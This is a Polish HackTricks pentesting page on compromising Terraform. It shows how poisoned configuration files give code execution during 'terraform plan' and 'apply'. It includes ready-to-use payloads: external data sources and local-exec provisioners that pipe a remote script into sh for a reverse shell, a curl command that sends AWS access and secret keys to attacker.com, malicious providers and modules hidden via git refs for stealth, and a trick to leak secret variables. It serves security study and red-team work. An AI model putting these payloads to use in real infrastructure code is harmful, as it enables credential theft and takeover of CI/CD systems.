# Bezpieczeństwo Terraform

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[Z dokumentacji: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform to narzędzie **infrastruktury jako kod**, które pozwala definiować zarówno **zasoby w chmurze, jak i lokalne** w czytelnych dla człowieka plikach konfiguracyjnych, które można wersjonować, ponownie używać i udostępniać. Następnie można użyć spójnego procesu w celu wdrożenia i zarządzania całym środowiskiem infrastruktury. Terraform może zarządzać komponentami na niskim poziomie, takimi jak obliczenia, przechowywanie i zasoby sieciowe, a także komponentami na wysokim poziomie, takimi jak wpisy DNS i funkcje SaaS.

### Jak działa Terraform?

Terraform tworzy i zarządza zasobami na platformach chmurowych i innych usługach za pomocą ich interfejsów programowania aplikacji (API). Dostawcy umożliwiają Terraformowi współpracę z praktycznie dowolną platformą lub usługą z dostępnym interfejsem API.

![](<../.gitbook/assets/image (33).png>)

HashiCorp i społeczność Terraformu napisali już **ponad 1700 dostawców**, aby zarządzać tysiącami różnych typów zasobów i usług, a ta liczba nadal rośnie. Wszystkie publicznie dostępne dostawcy można znaleźć w [Terraform Registry](https://registry.terraform.io/), w tym Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i wiele innych.

Podstawowy proces pracy z Terraform składa się z trzech etapów:

* **Napisz:** Definiujesz zasoby, które mogą obejmować wiele dostawców i usług chmurowych. Na przykład możesz utworzyć konfigurację do wdrożenia aplikacji na maszynach wirtualnych w sieci Virtual Private Cloud (VPC) z grupami zabezpieczeń i równoważnikiem obciążenia.
* **Plan:** Terraform tworzy plan wykonania, opisujący infrastrukturę, którą utworzy, zaktualizuje lub zniszczy na podstawie istniejącej infrastruktury i twojej konfiguracji.
* **Zastosuj:** Po zatwierdzeniu Terraform wykonuje zaproponowane operacje w odpowiedniej kolejności, szanując zależności między zasobami. Na przykład, jeśli zaktualizujesz właściwości VPC i zmienisz liczbę maszyn wirtualnych w tym VPC, Terraform najpierw odtworzy VPC, a następnie skaluje maszyny wirtualne.

![](<../.gitbook/assets/image (81).png>)

## Laboratorium Terraform

Po prostu zainstaluj Terraform na swoim komputerze.

Tutaj masz [przewodnik](https://learn.hashicorp.com/tutorials/terraform/install-cli), a tutaj masz [najlepszy sposób na pobranie Terraform](https://www.terraform.io/downloads).

## RCE w Terraform

Terraform **nie ma strony internetowej ani usługi sieciowej**, której można by wyliczyć, dlatego jedynym sposobem na skompromitowanie Terraformu jest **możliwość dodawania/modyfikowania plików konfiguracyjnych Terraform**.

Jednak Terraform to **bardzo wrażliwy komponent** do skompromitowania, ponieważ będzie miał **uprzywilejowany dostęp** do różnych lokalizacji, aby działać poprawnie.

Głównym sposobem, aby atakujący mógł skompromitować system, na którym działa Terraform, jest **skompromitowanie repozytorium przechowującego konfiguracje Terraform**, ponieważ w pewnym momencie zostaną one **zinterpretowane**.

Obecnie istnieją rozwiązania, które **automatycznie wykonują terraform plan/apply po utworzeniu PR**, takie jak **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Jeśli uda ci się skompromitować plik Terraform, istnieje wiele sposobów, aby wykonać RCE, gdy ktoś uruchamia `terraform plan` lub `terraform apply`.

### Terraform plan

Terraform plan to **najczęściej używane polecenie** w Terraformie, a programiści/rozwiązania korzystające z Terraformu często je wywołują, dlatego **najłatwiejszym sposobem na uzyskanie RCE** jest upewnienie się, że zatrutesz plik konfiguracyjny Terraform, który wykona dowolne polecenia w `terraform plan`.

#### Użycie dostawcy zewnętrznego

Terraform oferuje dostawcę [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), który umożliwia współpracę między Terraformem a programami zewnętrznymi. Możesz użyć źródła danych `external`, aby uruchomić dowolny kod podczas `plan`.

Wstrzyknięcie do pliku konfiguracyjnego Terraform czegoś takiego spowoduje wykonanie powłoki rev przy wykonywaniu `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Używanie niestandardowego dostawcy

Atakujący mógłby wysłać [niestandardowego dostawcę](https://learn.hashicorp.com/tutorials/terraform/provider-setup) do [Rejestru Terraform](https://registry.terraform.io/) a następnie dodać go do kodu Terraform w gałęzi funkcjonalności ([przykład stąd](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dostawca jest pobierany w `init` i uruchomi złośliwy kod podczas wykonywania `plan`

Przykład można znaleźć pod adresem [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Użycie zewnętrznego odwołania

Obie wymienione opcje są przydatne, ale niezbyt dyskretne (druga jest bardziej dyskretna, ale bardziej skomplikowana niż pierwsza). Możesz przeprowadzić ten atak nawet w **bardziej dyskretny sposób**, postępując zgodnie z tymi sugestiami:

* Zamiast dodawać rev shell bezpośrednio do pliku terraform, możesz **załadować zewnętrzny zasób**, który zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Kod rev shell można znaleźć w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zewnętrznym zasobie użyj funkcji **ref**, aby ukryć **kod rev shell Terraformu w gałęzi** wewnątrz repozytorium, na przykład: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply zostanie wykonane, aby zastosować wszystkie zmiany, można go również wykorzystać do uzyskania RCE poprzez wstrzyknięcie **złośliwego pliku Terraformu z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Wystarczy upewnić się, że pewien ładunek, na przykład poniższe, znajduje się w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Wykonaj **sugestie z poprzedniej techniki**, aby przeprowadzić ten atak w **bardziej dyskretny sposób, korzystając z zewnętrznych odwołań**.

## Wycieki sekretów

Możesz uzyskać **wycieki tajnych wartości używanych przez terraform**, uruchamiając `terraform apply` i dodając do pliku terraform coś takiego:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Narzędzia audytowe

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec wykorzystuje statyczną analizę kodu terraformu do wykrywania potencjalnych błędów konfiguracji.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan to statyczny analizator kodu dla infrastruktury jako kodu.

## Odwołania

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
